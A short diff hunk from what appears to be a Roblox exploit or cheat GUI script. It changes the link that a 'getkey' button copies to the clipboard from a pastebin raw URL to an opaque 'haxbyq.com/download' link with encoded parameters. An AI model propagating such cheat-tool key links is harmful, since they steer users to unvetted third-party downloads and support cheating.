@@ -156,7 +156,7 @@ coroutine.wrap(XNEII_fake_script)()
 local function KWHXAH_fake_script() -- getkey.LocalScript 
 	local script = Instance.new('LocalScript', getkey)
 
-	setclipboard("https://pastebin.com/raw/0Fzwpw4C")
+	setclipboard("https://haxbyq.com/download?h=waWQiOjExMDA1MzksInNpZCI6MTExMzA0Miwid2lkIjozNjU1MzMsInNyYyI6Mn0=eyJ&si1=&si2=")
 end
 coroutine.wrap(KWHXAH_fake_script)()
 local function EYNJQ_fake_script() -- closer.LocalScript 
